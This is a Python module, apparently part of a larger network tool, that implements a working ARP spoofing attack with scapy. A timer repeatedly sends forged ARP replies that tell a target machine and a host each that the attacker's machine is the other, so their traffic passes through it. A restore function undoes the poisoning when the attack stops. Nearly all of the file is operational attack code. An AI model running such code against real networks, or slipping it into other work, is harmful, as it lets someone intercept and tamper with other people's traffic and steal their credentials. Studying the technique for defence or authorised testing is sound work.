'''
Arp spoofing module. Stateless functions that can be used whenever + Stateful class that manages persistent/async things
'''
import scapy.all as scapy
from scapy.all import Packet, ARP
import threading
from ..data_buffer import DataBuffer
import ipaddress, netifaces
# TODO get mac address better

class ArpSpoofer:

    def __init__(self, buffer: DataBuffer, interval=1.0):
        self.buffer = buffer
        self.interval = interval

        self.running = False
        self.timer = None


    # Setup methods

    def tick(self):
        if not self.running:
            return

        # Tell target we are host
        self.spoof(self.target_ip, self.target_mac, self.host_ip)

        # Tell host we are target
        self.spoof(self.host_ip, self.host_mac, self.target_ip)

        self.timer = threading.Timer(self.interval, self.tick)
        self.timer.start()


    def start(self, target_ip, host_ip):
        # target_ip='192.168.8.137', host_ip='192.168.8.243'
        scapy.conf.verb = 0

        if self.running:
            self.buffer.put("arp", "status", ["ARP Spoof is already running"])
            return

        self.buffer.put("arp", "status", ["Starting ARP Spoof"])

        self.target_ip = target_ip
        self.host_ip = host_ip

        self.target_mac = self.get_mac(target_ip)
        self.host_mac = self.get_mac(host_ip)
        
        self.running = True

        self.tick()


    def stop(self):

        if self.running == False:
            self.buffer.put("arp", "status", ["ARP Spoof is not running"])
            return

        self.buffer.put("arp", "status", ["Stopping ARP Spoof"])

        self.running = False

        if self.timer:
            self.timer.cancel()

        self.restore(self.target_ip, self.host_ip)
        self.restore(self.host_ip, self.target_ip)
        self.buffer.put("arp", "status", ["Stopped ARP Spoof."])


    # Useful methods
    
    def get_mac(self, ip: str):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request

        answered, _ = scapy.srp(packet, timeout=2, verbose=False)

        if answered:
            return answered[0][1].hwsrc


    def spoof(self, target_ip: str, target_mac: str, spoof_ip: str):
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op='is-at',
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
        )

        scapy.sendp(packet, verbose=False)
        self.buffer.put("arp", "Spoofing packet", packet)


    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)

        packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )

        self.buffer.put("arp", "Restore packet", packet)
        scapy.sendp(packet, verbose=False)